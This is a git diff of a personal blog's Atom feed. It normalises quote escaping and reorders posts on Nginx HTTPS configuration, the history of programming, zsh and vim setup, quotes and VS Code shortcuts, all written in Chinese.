-&apos;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&apos;; access_log logs/access.log main;
+'&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;'; access_log logs/access.log main;
 
 
 
@@ -30158,7 +30143,7 @@ ssl_certificate_key www.example.com.ecdsa.key;
 
 运行命令测试 ECDSA 密码套件：
 
-$ openssl s_client -connect www.example.com:443 -cipher &apos;aECDSA&apos;
+$ openssl s_client -connect www.example.com:443 -cipher 'aECDSA'
 
 
 
@@ -30172,7 +30157,7 @@ Cipher : ECDHE-ECDSA-CHACHA20-POLY1305
 
 运行命令测试 RSA 密码套件：
 
-$ openssl s_client -connect www.example.com:443 -cipher &apos;aRSA&apos;
+$ openssl s_client -connect www.example.com:443 -cipher 'aRSA'
 
 
 
@@ -30230,7 +30215,7 @@ $ cd openssl-1.1.0f
 
 $ patch -p1 &amp;lt; ../openssl-openssl-patch-fee83cc1a9d1a1d2e35a1da18d3af5af4a f32ca8/openssl-1.1/OpenSSL1.1g-equal-preference-cipher-groups.patch 重新编译 OpenSSL 和 Nginx 后，就可以配置等价加密算法组，比如：
 
-ssl_ciphers &apos;[ECDHE-RSA-AES128-GCM-SHA256|ECDHE-RSA-CHACHA20-POLY1305]&apos; ; 至于如何测试，参考 10.1 节。
+ssl_ciphers '[ECDHE-RSA-AES128-GCM-SHA256|ECDHE-RSA-CHACHA20-POLY1305]' ; 至于如何测试，参考 10.1 节。
 
 5）通配符证书
 
@@ -30794,11 +30779,11 @@ $http2
 
 配置日志格式：
 
-log_format ssl &apos;[$http2] - [$ssl_protocol] - [$ssl_server_name]&apos;
+log_format ssl '[$http2] - [$ssl_protocol] - [$ssl_server_name]'
 
-&apos; - [$ssl_cipher] - [$ssl_session_reused]&apos;
+' - [$ssl_cipher] - [$ssl_session_reused]'
 
-&apos; - [$ssl_curves] - [$ssl_ciphers] &apos;;
+' - [$ssl_curves] - [$ssl_ciphers] ';
 
 注意，log_format 指令需要配置在 HTTP 容器内。
 
@@ -32062,8 +32047,7 @@ index index.html index.htm;
 
 ◎ ssl_client_certificate，指定中间证书 + 根证书校验客户端证书（代理服务器）。
 
-&lt;/IP&gt;&lt;/body&gt;&lt;/html&gt;</content><author><name>Hofer</name></author><category term="history" /><summary type="html">深入浅出 HTTPS：从原理到实战 from ZLibrary 豆瓣评论</summary></entry><entry><title type="html">科学上网</title><link href="http://localhost:4000/1984/" rel="alternate" type="text/html" title="科学上网" /><published>2022-09-05T00:00:00+08:00</published><updated>2022-09-05T00:00:00+08:00</updated><id>http://localhost:4000/1984</id><content type="html" xml:base="http://localhost:4000/1984/">&lt;h1 id=&quot;read&quot;&gt;Read&lt;/h1&gt;
-&lt;p&gt;&lt;a href=&quot;https://github.com/haoel/haoel.github.io&quot;&gt;https://github.com/haoel/haoel.github.io&lt;/a&gt;&lt;/p&gt;</content><author><name>Hofer</name></author><category term="Tool" /><summary type="html">Read https://github.com/haoel/haoel.github.io</summary></entry><entry><title type="html">什么塑造了今天的编程世界</title><link href="http://localhost:4000/an-illustrated-history-of-programming/" rel="alternate" type="text/html" title="什么塑造了今天的编程世界" /><published>2022-09-05T00:00:00+08:00</published><updated>2022-09-05T00:00:00+08:00</updated><id>http://localhost:4000/an-illustrated-history-of-programming</id><content type="html" xml:base="http://localhost:4000/an-illustrated-history-of-programming/">&lt;p&gt;西乔&amp;amp;霍炬&lt;/p&gt;
+&lt;/IP&gt;&lt;/body&gt;&lt;/html&gt;</content><author><name>Hofer</name></author><category term="history" /><summary type="html">深入浅出 HTTPS：从原理到实战 from ZLibrary 豆瓣评论</summary></entry><entry><title type="html">什么塑造了今天的编程世界</title><link href="http://localhost:4000/an-illustrated-history-of-programming/" rel="alternate" type="text/html" title="什么塑造了今天的编程世界" /><published>2022-09-05T00:00:00+08:00</published><updated>2022-09-05T00:00:00+08:00</updated><id>http://localhost:4000/an-illustrated-history-of-programming</id><content type="html" xml:base="http://localhost:4000/an-illustrated-history-of-programming/">&lt;p&gt;西乔&amp;amp;霍炬&lt;/p&gt;
 
 &lt;h1 id=&quot;第1季度&quot;&gt;第1季度&lt;/h1&gt;
 &lt;h2 id=&quot;1822年-差分机和分析机&quot;&gt;1822年 差分机和分析机&lt;/h2&gt;
@@ -32129,7 +32113,8 @@ index index.html index.htm;
 &lt;h2 id=&quot;2009年-恰逢其时的go语言&quot;&gt;2009年 恰逢其时的Go语言&lt;/h2&gt;
 &lt;h2 id=&quot;2010年-rust语言&quot;&gt;2010年 Rust语言&lt;/h2&gt;
 &lt;h2 id=&quot;2013年-docker和kubernetes&quot;&gt;2013年 Docker和Kubernetes&lt;/h2&gt;
-&lt;h2 id=&quot;2014年-html5标准-vs-app生态&quot;&gt;2014年 HTML5标准 VS App生态&lt;/h2&gt;</content><author><name>Hofer</name></author><category term="history" /><summary type="html">西乔&amp;amp;霍炬</summary></entry><entry><title type="html">编程随想｜扫盲 HTTPS 和 SSL/TLS 协议</title><link href="http://localhost:4000/https-program-think/" rel="alternate" type="text/html" title="编程随想｜扫盲 HTTPS 和 SSL/TLS 协议" /><published>2022-08-16T00:00:00+08:00</published><updated>2022-08-16T00:00:00+08:00</updated><id>http://localhost:4000/https-program-think</id><content type="html" xml:base="http://localhost:4000/https-program-think/">&lt;p&gt;原文链接 &lt;a href=&quot;https://program-think.blogspot.com/2014/11/https-ssl-tls-0.html&quot;&gt;https://program-think.blogspot.com/2014/11/https-ssl-tls-0.html&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&quot;2014年-html5标准-vs-app生态&quot;&gt;2014年 HTML5标准 VS App生态&lt;/h2&gt;</content><author><name>Hofer</name></author><category term="history" /><summary type="html">西乔&amp;amp;霍炬</summary></entry><entry><title type="html">科学上网</title><link href="http://localhost:4000/1984/" rel="alternate" type="text/html" title="科学上网" /><published>2022-09-05T00:00:00+08:00</published><updated>2022-09-05T00:00:00+08:00</updated><id>http://localhost:4000/1984</id><content type="html" xml:base="http://localhost:4000/1984/">&lt;h1 id=&quot;read&quot;&gt;Read&lt;/h1&gt;
+&lt;p&gt;&lt;a href=&quot;https://github.com/haoel/haoel.github.io&quot;&gt;https://github.com/haoel/haoel.github.io&lt;/a&gt;&lt;/p&gt;</content><author><name>Hofer</name></author><category term="Tool" /><summary type="html">Read https://github.com/haoel/haoel.github.io</summary></entry><entry><title type="html">编程随想｜扫盲 HTTPS 和 SSL/TLS 协议</title><link href="http://localhost:4000/https-program-think/" rel="alternate" type="text/html" title="编程随想｜扫盲 HTTPS 和 SSL/TLS 协议" /><published>2022-08-16T00:00:00+08:00</published><updated>2022-08-16T00:00:00+08:00</updated><id>http://localhost:4000/https-program-think</id><content type="html" xml:base="http://localhost:4000/https-program-think/">&lt;p&gt;原文链接 &lt;a href=&quot;https://program-think.blogspot.com/2014/11/https-ssl-tls-0.html&quot;&gt;https://program-think.blogspot.com/2014/11/https-ssl-tls-0.html&lt;/a&gt;&lt;/p&gt;
 
 &lt;h1 id=&quot;引子&quot;&gt;引子&lt;/h1&gt;
 &lt;p&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/H_exzSD20W99qSJhGkLJFPwj3gU7VF_t9VGsbHS19Zkky6Vgrhcn8OG4c3--8-qr3DjL-H6lOQVfYcYEZ5qQp19yOycAvaL-Dnl29AqINsIhWK6ITliRP_tBL4nZ4z_Vw0IO&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
@@ -33000,7 +32985,7 @@ git clone https://github.com/zsh-users/zsh-autosuggestions.git &lt;span class=&q
 git clone https://github.com/zsh-users/zsh-syntax-highlighting.git &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;ZSH_CUSTOM&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;:-&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;~/.oh-my-zsh/custom&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;/plugins/zsh-syntax-highlighting
 vim ~/.zshrc &lt;span class=&quot;c&quot;&gt;# plugins=(git zsh-syntax-highlighting zsh-autosuggestions)&lt;/span&gt;
 &lt;span class=&quot;nb&quot;&gt;alias &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;gitpull&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;git pull&quot;&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;alias &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;gp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;git add . &amp;amp;&amp;amp; git commit -m &apos;build&apos; &amp;amp;&amp;amp; git push
+&lt;span class=&quot;nb&quot;&gt;alias &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;gp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;git add . &amp;amp;&amp;amp; git commit -m 'build' &amp;amp;&amp;amp; git push
 source ~/.zshrc 
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
@@ -33012,11 +32997,4 @@ source ~/.zshrc 
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;set fileencodings=ucs-bom,utf-8,cp936,gb18030,big5,euc-jp,euc-kr,latin1
 set fileencoding=utf-8
 set encoding=utf-8
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Hofer</name></author><category term="Tool" /><summary type="html">zsh oh-my-zsh ```sh install zsh echo $SHELL cat /etc/shells apt update &amp;amp;&amp;amp; apt install zsh -y chsh -s /bin/zsh reboot</summary></entry><entry><title type="html">Quotes</title><link href="http://localhost:4000/quotes/" rel="alternate" type="text/html" title="Quotes" /><published>2022-08-03T00:00:00+08:00</published><updated>2022-08-03T00:00:00+08:00</updated><id>http://localhost:4000/quotes</id><content type="html" xml:base="http://localhost:4000/quotes/">&lt;p&gt;从小开始，我就拒绝接受没有弄明白的道理。～&lt;a href=&quot;https://program-think.blogspot.com/https://blog.codingnow.com/2007/08/e.html&quot;&gt;云风&lt;/a&gt;&lt;/p&gt;
-
-&lt;h1 id=&quot;相关网站&quot;&gt;相关网站&lt;/h1&gt;
-&lt;p&gt;&lt;a href=&quot;https://zh.wikiquote.org/&quot;&gt;https://zh.wikiquote.org/&lt;/a&gt;&lt;br /&gt;
-&lt;a href=&quot;https://program-think.blogspot.com/2014/08/maxim.html&quot;&gt;https://program-think.blogspot.com/2014/08/maxim.html&lt;/a&gt;&lt;/p&gt;</content><author><name>Hofer</name></author><category term="quotes" /><summary type="html">从小开始，我就拒绝接受没有弄明白的道理。～云风</summary></entry><entry><title type="html">VS Code Tips</title><link href="http://localhost:4000/vscode-tips/" rel="alternate" type="text/html" title="VS Code Tips" /><published>2022-08-02T00:00:00+08:00</published><updated>2022-08-02T00:00:00+08:00</updated><id>http://localhost:4000/vscode-tips</id><content type="html" xml:base="http://localhost:4000/vscode-tips/">&lt;h1 id=&quot;快捷键&quot;&gt;快捷键&lt;/h1&gt;
-&lt;p&gt;全局搜索&lt;/p&gt;
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ctrl+shift+f
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Hofer</name></author><category term="Tool" /><summary type="html">快捷键 全局搜索 ctrl+shift+f</summary></entry></feed>
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Hofer</name></author><category term="Tool" /><summary type="html">zsh oh-my-zsh ```sh install zsh echo $SHELL cat /etc/shells apt update &amp;amp;&amp;amp; apt install zsh -y chsh -s /bin/zsh reboot</summary></entry></feed>
